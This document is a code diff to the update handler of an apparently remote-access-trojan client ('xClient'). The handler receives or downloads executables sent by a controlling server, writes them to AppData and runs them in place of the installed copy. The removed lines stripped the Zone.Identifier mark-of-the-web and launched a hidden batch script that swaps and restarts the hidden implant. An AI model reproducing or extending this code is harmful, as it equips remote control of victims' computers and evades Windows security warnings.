@@ -1,9 +1,9 @@
 ﻿using System;
-using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Threading;
 using xClient.Config;
+using xClient.Core.Helper;
 
 namespace xClient.Core.Commands
 {
@@ -21,10 +21,44 @@ namespace xClient.Core.Commands
         public static void HandleUpdate(Packets.ServerPackets.Update command, Client client)
         {
             // i dont like this updating... if anyone has a better idea feel free to edit it
-            new Packets.ClientPackets.Status("Downloading file...").Execute(client);
+            if (string.IsNullOrEmpty(command.DownloadURL))
+            {
+                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), command.FileName);
+
+                try
+                {
+                    if (command.CurrentBlock == 0 && command.Block[0] != 'M' && command.Block[1] != 'Z')
+                        throw new Exception("No executable file");
+
+                    FileSplit destFile = new FileSplit(filePath);
+
+                    if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
+                    {
+                        new Packets.ClientPackets.Status(string.Format("Writing failed: {0}", destFile.LastError)).Execute(
+                            client);
+                        return;
+                    }
+
+                    if ((command.CurrentBlock + 1) == command.MaxBlocks) // Upload finished
+                    {
+                        new Packets.ClientPackets.Status("Updating...").Execute(client);
+
+                        SystemCore.Update(client, filePath);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    DeleteFile(filePath);
+                    new Packets.ClientPackets.Status(string.Format("Update failed: {0}", ex.Message)).Execute(client);
+                }
+
+                return;
+            }
 
             new Thread(() =>
             {
+                new Packets.ClientPackets.Status("Downloading file...").Execute(client);
+
                 string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                     Helper.Helper.GetRandomFilename(12, ".exe"));
 
@@ -42,56 +76,9 @@ namespace xClient.Core.Commands
                     return;
                 }
 
-                new Packets.ClientPackets.Status("Downloaded File!").Execute(client);
-
                 new Packets.ClientPackets.Status("Updating...").Execute(client);
 
-                try
-                {
-                    DeleteFile(tempFile + ":Zone.Identifier");
-
-                    var bytes = File.ReadAllBytes(tempFile);
-                    if (bytes[0] != 'M' && bytes[1] != 'Z')
-                        throw new Exception("no pe file");
-
-                    string filename = Path.Combine(
-                        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                        Helper.Helper.GetRandomFilename(12, ".bat"));
-
-                    string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE)
-                        ? "@echo off" + "\n" +
-                          "echo DONT CLOSE THIS WINDOW!" + "\n" +
-                          "ping -n 20 localhost > nul" + "\n" +
-                          "del /A:H " + "\"" + SystemCore.MyPath + "\"" + "\n" +
-                          "move " + "\"" + tempFile + "\"" + " " + "\"" + SystemCore.MyPath + "\"" + "\n" +
-                          "start \"\" " + "\"" + SystemCore.MyPath + "\"" + "\n" +
-                          "del " + "\"" + filename + "\""
-                        : "@echo off" + "\n" +
-                          "echo DONT CLOSE THIS WINDOW!" + "\n" +
-                          "ping -n 20 localhost > nul" + "\n" +
-                          "del " + "\"" + SystemCore.MyPath + "\"" + "\n" +
-                          "move " + "\"" + tempFile + "\"" + " " + "\"" + SystemCore.MyPath + "\"" + "\n" +
-                          "start \"\" " + "\"" + SystemCore.MyPath + "\"" + "\n" +
-                          "del " + "\"" + filename + "\""
-                        ;
-
-                    File.WriteAllText(filename, uninstallBatch);
-                    ProcessStartInfo startInfo = new ProcessStartInfo();
-                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                    startInfo.CreateNoWindow = true;
-                    startInfo.UseShellExecute = true;
-                    startInfo.FileName = filename;
-                    Process.Start(startInfo);
-
-                    SystemCore.Disconnect = true;
-                    client.Disconnect();
-                }
-                catch
-                {
-                    DeleteFile(tempFile);
-                    new Packets.ClientPackets.Status("Update failed!").Execute(client);
-                    return;
-                }
+                SystemCore.Update(client, tempFile);
             }).Start();
         }
     }
